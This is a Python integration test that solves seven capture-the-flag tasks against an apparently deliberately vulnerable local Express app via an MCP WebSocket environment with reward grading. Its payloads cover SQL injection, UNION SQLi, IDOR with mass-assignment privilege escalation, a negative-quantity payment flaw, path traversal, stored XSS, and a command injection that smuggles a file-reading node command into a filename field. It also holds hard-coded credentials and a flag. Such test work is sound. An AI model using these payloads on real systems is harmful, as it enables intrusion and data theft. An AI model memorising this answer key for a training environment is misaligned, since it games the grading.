"""
Integration test via the /mcp WebSocket endpoint.
This tests the full exploit chain using persistent MCP sessions.

Tests 7 exploit tasks plus one reward-progression check against the
Node.js/Express vulnerable app.
"""
import asyncio
import json
import sys

# Avoid UnicodeEncodeError on Windows consoles defaulting to cp1252
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

async def mcp_ws_call(ws, method, params=None, req_id=1):
    """Send a JSON-RPC request over the MCP WebSocket and get the response."""
    import websockets
    msg = json.dumps({
        "jsonrpc": "2.0",
        "id": req_id,
        "method": method,
        "params": params or {}
    })
    await ws.send(msg)
    raw = await asyncio.wait_for(ws.recv(), timeout=30)
    return json.loads(raw)


def parse_tool_result(resp):
    """Extract the tool result dict from a JSON-RPC response."""
    if "result" not in resp:
        return {"error": resp.get("error", {}).get("message", "Unknown error")}
    result = resp["result"]
    # If it's a dict with 'content' (MCP tool result format):
    if isinstance(result, dict) and "content" in result:
        items = result["content"]
        if items and isinstance(items, list):
            text = items[0].get("text", "{}")
            try:
                return json.loads(text)
            except json.JSONDecodeError:
                return {"raw": text}
    # Direct dict result
    if isinstance(result, dict):
        return result
    # String result
    if isinstance(result, str):
        try:
            return json.loads(result)
        except json.JSONDecodeError:
            return {"raw": result}
    return {"raw": str(result)}


def unwrap_tool_result(result):
    """Extract plain tool data from OpenEnv/FastMCP wrappers."""
    if hasattr(result, "data"):
        return result.data
    if isinstance(result, dict) and "data" in result:
        return result["data"]
    return result


# ─────────────────────────────────────────────
# TEST 1: SQL Injection Login Bypass (Easy)
# ─────────────────────────────────────────────
async def test_sqli():
    """Test the SQLi login bypass exploit chain."""
    import websockets

    print("=" * 60)
    print("TEST: SQLi Login Bypass (Easy)")
    print("=" * 60)

    try:
        async with websockets.connect("ws://localhost:8000/mcp", open_timeout=15) as ws:
            # 1. Start task
            print("\n[1] Starting sqli_login task...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "start_task",
                "arguments": {"task_name": "sqli_login"}
            }, req_id=1)
            result = parse_tool_result(resp)
            assert result.get("status") == "ready", f"Expected ready, got {result}"

            # 2. View source code
            print("[2] Reading src/routes/auth.js...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "view_source",
                "arguments": {"file_path": "src/routes/auth.js"}
            }, req_id=2)
            result = parse_tool_result(resp)
            content = result.get("content", "")
            assert "${username}" in content or "${password}" in content, "No vulnerable SQL pattern found"
            print("    Vulnerable SQL query detected!")

            # 3. SQLi exploit
            print("[3] Sending SQLi payload to /api/auth/login...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "POST",
                    "path": "/api/auth/login",
                    "body": {"username": "' OR 1=1 --", "password": "x"}
                }
            }, req_id=3)
            result = parse_tool_result(resp)
            body = result.get("body", {})
            assert result.get("status_code") == 200, f"Expected 200, got {result.get('status_code')}"
            assert body.get("role") == "admin", f"Expected admin role, got {body.get('role')}"
            token = body.get("token", "")
            print(f"    Logged in as admin! Token: {token[:30]}...")

            # 4. Access admin flag
            print("[4] Accessing /api/admin/flag?task=sqli_login...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "GET",
                    "path": "/api/admin/flag?task=sqli_login"
                }
            }, req_id=4)
            result = parse_tool_result(resp)
            body = result.get("body", {})
            flag = body.get("flag", "") if isinstance(body, dict) else ""
            assert flag.startswith("FLAG{"), f"No flag found: {body}"
            print(f"    Flag: {flag}")

            # 5. Submit flag
            print(f"[5] Submitting flag...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "submit_flag",
                "arguments": {"flag": flag}
            }, req_id=5)
            result = parse_tool_result(resp)
            assert result.get("correct") is True
            print(f"    Score: {result.get('score')}")
            print("    PASS: SQLi Login Bypass")
            return True

    except Exception as e:
        print(f"    FAIL: {e}")
        import traceback
        traceback.print_exc()
        return False


# ─────────────────────────────────────────────
# TEST 2: IDOR + Privilege Escalation (Medium)
# ─────────────────────────────────────────────
async def test_idor():
    """Test IDOR + mass-assignment privilege escalation."""
    import websockets

    print("\n" + "=" * 60)
    print("TEST: IDOR + Privilege Escalation (Medium)")
    print("=" * 60)

    try:
        async with websockets.connect("ws://localhost:8000/mcp", open_timeout=15) as ws:
            print("\n[1] Starting idor_privesc task...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "start_task",
                "arguments": {"task_name": "idor_privesc"}
            }, req_id=1)
            result = parse_tool_result(resp)
            assert result.get("status") == "ready"

            # Register
            print("[2] Registering low-privilege user...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "POST",
                    "path": "/api/auth/register",
                    "body": {"username": "idor_tester_99", "password": "secret", "email": "idor@test.local"}
                }
            }, req_id=2)
            result = parse_tool_result(resp)
            assert result.get("status_code") == 201
            body = result.get("body", {})
            my_id = body.get("user", {}).get("id")
            token = body.get("token", "")
            print(f"    user_id={my_id}")

            # IDOR: view admin profile
            print("[3] IDOR: fetching admin profile via GET /api/users/1...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "GET",
                    "path": "/api/users/1",
                    "headers": {"Authorization": f"Bearer {token}"}
                }
            }, req_id=3)
            result = parse_tool_result(resp)
            assert result.get("status_code") == 200
            admin_body = result.get("body", {})
            admin_user = admin_body.get("user", admin_body)
            print(f"    Admin role: {admin_user.get('role')}")

            # Mass assignment: escalate to admin
            print(f"[4] Mass assignment: PUT /api/users/{my_id} role=admin...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "PUT",
                    "path": f"/api/users/{my_id}",
                    "body": {"role": "admin"},
                    "headers": {"Authorization": f"Bearer {token}"}
                }
            }, req_id=4)
            result = parse_tool_result(resp)
            assert result.get("status_code") == 200
            put_body = result.get("body", {})
            new_role = put_body.get("user", {}).get("role")
            print(f"    Updated role: {new_role}")

            # Get flag - need new token with admin role (re-login or use mass_assignment flag from response)
            flag = put_body.get("flag", "")
            if not flag:
                # Try accessing admin flag endpoint with API key (from IDOR on admin profile)
                print("[5] Accessing /api/admin/flag?task=mass_assignment...")
                resp = await mcp_ws_call(ws, "tools/call", {
                    "name": "http_request",
                    "arguments": {
                        "method": "GET",
                        "path": "/api/admin/flag?task=mass_assignment&key=sk_admin_master_key_2024"
                    }
                }, req_id=5)
                result = parse_tool_result(resp)
                body = result.get("body", {})
                flag = body.get("flag", "") if isinstance(body, dict) else ""

            assert flag.startswith("FLAG{"), f"No flag found: {flag}"
            print(f"    Flag: {flag}")

            print(f"[6] Submitting flag...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "submit_flag",
                "arguments": {"flag": flag}
            }, req_id=6)
            result = parse_tool_result(resp)
            assert result.get("correct") is True
            print(f"    Score: {result.get('score')}")
            print("    PASS: IDOR + Privilege Escalation")
            return True

    except Exception as e:
        print(f"    FAIL: {e}")
        import traceback
        traceback.print_exc()
        return False


# ─────────────────────────────────────────────
# TEST 3: Payment Logic Flaw (Hard)
# ─────────────────────────────────────────────
async def test_payment():
    """Test the payment logic exploit chain."""
    import websockets

    print("\n" + "=" * 60)
    print("TEST: Payment Logic Flaw (Hard)")
    print("=" * 60)

    try:
        async with websockets.connect("ws://localhost:8000/mcp", open_timeout=15) as ws:
            print("\n[1] Starting payment_logic task...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "start_task",
                "arguments": {"task_name": "payment_logic"}
            }, req_id=1)
            result = parse_tool_result(resp)
            assert result.get("status") == "ready"

            # Register
            print("[2] Registering user...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "POST",
                    "path": "/api/auth/register",
                    "body": {"username": "pay_tester_99", "password": "pass"}
                }
            }, req_id=2)
            result = parse_tool_result(resp)
            assert result.get("status_code") == 201
            token = result.get("body", {}).get("token", "")

            # Add product with negative quantity
            print("[3] Adding product with qty=-5...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "POST",
                    "path": "/api/cart/add",
                    "body": {"product_id": 3, "quantity": -5},
                    "headers": {"Authorization": f"Bearer {token}"}
                }
            }, req_id=3)
            result = parse_tool_result(resp)
            assert result.get("status_code") == 200
            print(f"    Cart total: {result.get('body', {}).get('cart_total')}")

            # Checkout
            print("[4] Checking out with negative total...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "POST",
                    "path": "/api/checkout",
                    "headers": {"Authorization": f"Bearer {token}"}
                }
            }, req_id=4)
            result = parse_tool_result(resp)
            body = result.get("body", {})
            debug = body.get("debug_info", "") if isinstance(body, dict) else ""
            print(f"    Total: {body.get('total')}")
            print(f"    Debug: {debug}")

            assert isinstance(debug, str) and debug.startswith("FLAG{"), f"No flag in debug_info: {debug}"

            print(f"[5] Submitting flag: {debug}")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "submit_flag",
                "arguments": {"flag": debug}
            }, req_id=5)
            result = parse_tool_result(resp)
            assert result.get("correct") is True
            print(f"    Score: {result.get('score')}")
            print("    PASS: Payment Logic Flaw")
            return True

    except Exception as e:
        print(f"    FAIL: {e}")
        import traceback
        traceback.print_exc()
        return False


# ─────────────────────────────────────────────
# TEST 4: Path Traversal (Medium)
# ─────────────────────────────────────────────
async def test_path_traversal():
    """Test path traversal file read."""
    import websockets

    print("\n" + "=" * 60)
    print("TEST: Path Traversal File Read (Medium)")
    print("=" * 60)

    try:
        async with websockets.connect("ws://localhost:8000/mcp", open_timeout=15) as ws:
            print("\n[1] Starting path_traversal task...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "start_task",
                "arguments": {"task_name": "path_traversal"}
            }, req_id=1)
            result = parse_tool_result(resp)
            assert result.get("status") == "ready"

            # Read source
            print("[2] Reading src/routes/files.js...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "view_source",
                "arguments": {"file_path": "src/routes/files.js"}
            }, req_id=2)
            result = parse_tool_result(resp)
            assert result.get("lines", 0) > 0

            # Path traversal to read flag.txt
            print("[3] Path traversal: GET /api/files/..%2fflag.txt...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "GET",
                    "path": "/api/files/..%2fflag.txt"
                }
            }, req_id=3)
            result = parse_tool_result(resp)
            body = result.get("body", {})
            content = body.get("content", "") if isinstance(body, dict) else ""
            print(f"    Content: {content[:60]}")

            flag = content.strip() if content.strip().startswith("FLAG{") else ""
            if not flag:
                # Try with path traversal
                print("[3b] Trying /api/files/../flag.txt...")
                resp = await mcp_ws_call(ws, "tools/call", {
                    "name": "http_request",
                    "arguments": {
                        "method": "GET",
                        "path": "/api/files/..%2fflag.txt"
                    }
                }, req_id=31)
                result = parse_tool_result(resp)
                body = result.get("body", {})
                content = body.get("content", "") if isinstance(body, dict) else ""
                flag = content.strip() if content.strip().startswith("FLAG{") else ""

            assert flag, f"No flag found in file content"
            print(f"    Flag: {flag}")

            print(f"[4] Submitting flag...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "submit_flag",
                "arguments": {"flag": flag}
            }, req_id=4)
            result = parse_tool_result(resp)
            assert result.get("correct") is True
            print(f"    Score: {result.get('score')}")
            print("    PASS: Path Traversal")
            return True

    except Exception as e:
        print(f"    FAIL: {e}")
        import traceback
        traceback.print_exc()
        return False


# ─────────────────────────────────────────────
# TEST 5: Stored XSS (Medium)
# ─────────────────────────────────────────────
async def test_xss():
    """Test stored XSS in reviews."""
    import websockets

    print("\n" + "=" * 60)
    print("TEST: Stored XSS in Reviews (Medium)")
    print("=" * 60)

    try:
        async with websockets.connect("ws://localhost:8000/mcp", open_timeout=15) as ws:
            print("\n[1] Starting xss_stored task...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "start_task",
                "arguments": {"task_name": "xss_stored"}
            }, req_id=1)
            result = parse_tool_result(resp)
            assert result.get("status") == "ready"

            # Register
            print("[2] Registering user...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "POST",
                    "path": "/api/auth/register",
                    "body": {"username": "xss_tester_99", "password": "pass"}
                }
            }, req_id=2)
            result = parse_tool_result(resp)
            token = result.get("body", {}).get("token", "")

            # Post XSS review
            print("[3] Posting review with XSS payload...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "POST",
                    "path": "/api/reviews",
                    "body": {
                        "product_id": 1,
                        "rating": 5,
                        "body": "<script>alert('xss')</script>"
                    },
                    "headers": {"Authorization": f"Bearer {token}"}
                }
            }, req_id=3)
            result = parse_tool_result(resp)
            body = result.get("body", {})
            flag = body.get("flag", "") if isinstance(body, dict) else ""
            print(f"    Response flag: {flag}")

            assert flag.startswith("FLAG{"), f"No flag: {body}"

            print(f"[4] Submitting flag...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "submit_flag",
                "arguments": {"flag": flag}
            }, req_id=4)
            result = parse_tool_result(resp)
            assert result.get("correct") is True
            print(f"    Score: {result.get('score')}")
            print("    PASS: Stored XSS")
            return True

    except Exception as e:
        print(f"    FAIL: {e}")
        import traceback
        traceback.print_exc()
        return False


# ─────────────────────────────────────────────
# TEST 6: UNION SQL Injection (Medium)
# ─────────────────────────────────────────────
async def test_sqli_union():
    """Test UNION-based SQL injection on product search."""
    import websockets

    print("\n" + "=" * 60)
    print("TEST: UNION SQL Injection (Medium)")
    print("=" * 60)

    try:
        async with websockets.connect("ws://localhost:8000/mcp", open_timeout=15) as ws:
            print("\n[1] Starting sqli_union task...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "start_task",
                "arguments": {"task_name": "sqli_union"}
            }, req_id=1)
            result = parse_tool_result(resp)
            assert result.get("status") == "ready"

            # UNION SQLi
            print("[2] UNION SQLi on /api/products?search=...")
            payload = "' UNION SELECT 1,flag_value,3,4,5,6,7 FROM flags WHERE task_name='sqli_union'--"
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "GET",
                    "path": f"/api/products?search={payload}"
                }
            }, req_id=2)
            result = parse_tool_result(resp)
            body = result.get("body", {})
            products = body.get("products", []) if isinstance(body, dict) else []
            print(f"    Products returned: {len(products)}")

            # Find flag in results
            flag = ""
            for p in products:
                if isinstance(p, dict):
                    for v in p.values():
                        if isinstance(v, str) and v.startswith("FLAG{"):
                            flag = v
                            break

            assert flag.startswith("FLAG{"), f"No flag found in UNION results: {products[:2]}"
            print(f"    Flag: {flag}")

            print(f"[3] Submitting flag...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "submit_flag",
                "arguments": {"flag": flag}
            }, req_id=3)
            result = parse_tool_result(resp)
            assert result.get("correct") is True
            print(f"    Score: {result.get('score')}")
            print("    PASS: UNION SQL Injection")
            return True

    except Exception as e:
        print(f"    FAIL: {e}")
        import traceback
        traceback.print_exc()
        return False


# ─────────────────────────────────────────────
# TEST 7: Command Injection (Medium)
# ─────────────────────────────────────────────
async def test_command_injection():
    """Test OS command injection via admin export."""
    import websockets

    print("\n" + "=" * 60)
    print("TEST: Command Injection (Medium)")
    print("=" * 60)

    try:
        async with websockets.connect("ws://localhost:8000/mcp", open_timeout=15) as ws:
            print("\n[1] Starting command_injection task...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "start_task",
                "arguments": {"task_name": "command_injection"}
            }, req_id=1)
            result = parse_tool_result(resp)
            assert result.get("status") == "ready"

            # Login as admin (for auth)
            print("[2] Logging in as admin...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "POST",
                    "path": "/api/auth/login",
                    "body": {"username": "admin", "password": "admin123"}
                }
            }, req_id=2)
            result = parse_tool_result(resp)
            token = result.get("body", {}).get("token", "")

            # Command injection using node -e (cross-platform: works on both Windows cmd.exe and Linux sh)
            # On Linux you could also use: "; cat flag.txt #"
            print("[3] Command injection via /api/admin/export...")
            payload = '&& node -e "process.stdout.write(require(\'fs\').readFileSync(\'.secret_flag\',\'utf8\'))" #'
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "http_request",
                "arguments": {
                    "method": "POST",
                    "path": "/api/admin/export",
                    "body": {"filename": payload},
                    "headers": {"Authorization": f"Bearer {token}"}
                }
            }, req_id=3)
            result = parse_tool_result(resp)
            body = result.get("body", {})
            output = str(body.get("output", "")) + str(body.get("stdout", ""))
            print(f"    Output: {output[:100]}")

            # Find flag in output
            flag = ""
            for part in [output, str(body.get("stderr", ""))]:
                if "FLAG{" in part:
                    import re
                    match = re.search(r"FLAG\{[^}]+\}", part)
                    if match:
                        flag = match.group(0)
                        break

            assert flag.startswith("FLAG{"), f"No flag in command output"
            print(f"    Flag: {flag}")

            print(f"[4] Submitting flag...")
            resp = await mcp_ws_call(ws, "tools/call", {
                "name": "submit_flag",
                "arguments": {"flag": flag}
            }, req_id=4)
            result = parse_tool_result(resp)
            assert result.get("correct") is True
            print(f"    Score: {result.get('score')}")
            print("    PASS: Command Injection")
            return True

    except Exception as e:
        print(f"    FAIL: {e}")
        import traceback
        traceback.print_exc()
        return False


async def test_partial_reward_progression():
    """Verify that step rewards expose partial grading before flag submission."""
    from client import CtfEnv
    from openenv.core.env_server.mcp_types import CallToolAction, CallToolObservation

    print("\n" + "=" * 60)
    print("TEST: Partial Reward Progression")
    print("=" * 60)

    async def call_tool(env, name, **kwargs):
        step_result = await env.step(CallToolAction(tool_name=name, arguments=kwargs))
        observation = step_result.observation
        result = unwrap_tool_result(
            observation.result if isinstance(observation, CallToolObservation) else None
        )
        return step_result, result

    try:
        async with CtfEnv(base_url="http://localhost:8000") as env:
            await env.reset(task="idor_privesc")

            print("\n[1] Reading task source...")
            step_result, _ = await call_tool(env, "view_source", file_path="src/routes/users.js")
            source_reward = step_result.reward or 0.0
            assert source_reward > 0.0, f"Expected partial reward for source read, got {source_reward}"

            print("[2] Registering user...")
            step_result, result = await call_tool(
                env,
                "http_request",
                method="POST",
                path="/api/auth/register",
                body={
                    "username": "reward_tester_99",
                    "password": "secret",
                    "email": "reward@test.local",
                },
            )
            register_reward = step_result.reward or 0.0
            assert register_reward > 0.0, f"Expected partial reward for registration, got {register_reward}"
            token = result.get("body", {}).get("token", "")
            user_id = result.get("body", {}).get("user", {}).get("id")

            print("[3] Exploiting IDOR...")
            step_result, _ = await call_tool(
                env,
                "http_request",
                method="GET",
                path="/api/users/1",
                headers={"Authorization": f"Bearer {token}"},
            )
            idor_reward = step_result.reward or 0.0
            assert idor_reward > 0.0, f"Expected partial reward for IDOR, got {idor_reward}"

            print("[4] Escalating privileges...")
            step_result, _ = await call_tool(
                env,
                "http_request",
                method="PUT",
                path=f"/api/users/{user_id}",
                body={"role": "admin"},
                headers={"Authorization": f"Bearer {token}"},
            )
            privesc_reward = step_result.reward or 0.0
            assert privesc_reward > 0.0, f"Expected partial reward for privilege escalation, got {privesc_reward}"
            assert step_result.done is False, "Episode should not finish before flag submission"

            print("[5] Submitting final flag...")
            step_result, result = await call_tool(
                env,
                "submit_flag",
                flag="FLAG{mass_assignment_privesc_2024}",
            )
            final_score = result.get("score")
            assert step_result.done is True, "Episode should finish on correct flag submission"
            assert final_score >= 0.95, f"Expected final score >= 0.95, got {final_score}"

            print(
                "    Intermediate rewards:",
                [round(value, 2) for value in (source_reward, register_reward, idor_reward, privesc_reward)],
            )
            print(f"    Final score: {final_score}")
            print("    PASS: Partial Reward Progression")
            return True

    except Exception as e:
        print(f"    FAIL: {e}")
        import traceback
        traceback.print_exc()
        return False


async def main():
    tests = [
        ("SQLi Login", test_sqli),
        ("IDOR Privesc", test_idor),
        ("Payment Logic", test_payment),
        ("Path Traversal", test_path_traversal),
        ("Stored XSS", test_xss),
        ("UNION SQLi", test_sqli_union),
        ("Command Injection", test_command_injection),
        ("Partial Reward Progression", test_partial_reward_progression),
    ]
    passed = 0
    total = len(tests)

    for name, test_fn in tests:
        try:
            if await test_fn():
                passed += 1
        except Exception as e:
            print(f"    FAIL ({name}): {e}")

    print(f"\n{'='*60}")
    print(f"FINAL RESULTS: {passed}/{total} tests passed")
    print(f"{'='*60}")
    return passed == total


if __name__ == "__main__":
    success = asyncio.run(main())
    sys.exit(0 if success else 1)
